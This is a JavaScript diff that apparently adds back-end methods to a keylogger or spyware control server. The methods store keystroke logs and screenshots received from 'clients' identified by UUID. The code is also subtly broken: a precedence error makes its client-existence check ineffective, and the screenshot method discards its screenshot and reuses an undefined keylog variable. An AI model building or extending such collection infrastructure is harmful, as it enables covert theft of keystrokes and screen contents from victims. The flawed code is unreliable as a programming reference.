@@ -37,6 +37,40 @@ const clientService = {
         })
 
         return client
+    },
+    addKeylogs: async function (uuid, keylogsArray) {
+
+        const client = await clientDao.findOneByUuid(uuid)
+
+        // If he doesn't exist
+        if ((!client instanceof Client)) {
+            console.log("Pas de client")
+            return { isAdded: false }
+        }
+
+        if (keylogsArray instanceof Array) {
+            keylogsArray.forEach(keylogs => {
+                clientDao.insertLogs(client.dataValues.id, keylogs)
+            });
+        }
+        return { isAdded: true }
+    },
+    addScreenshot: async function (uuid, screenshot) {
+
+        const client = await clientDao.findOneByUuid(uuid)
+
+        // If he doesn't exist
+        if ((!client instanceof Client)) {
+            console.log("Pas de client")
+            return { isAdded: false }
+        }
+
+        if (keylogsArray instanceof Array) {
+            keylogsArray.forEach(keylogs => {
+                clientDao.insertLogs(client.dataValues.id, keylogs)
+            });
+        }
+        return { isAdded: true }
     }
 }
 
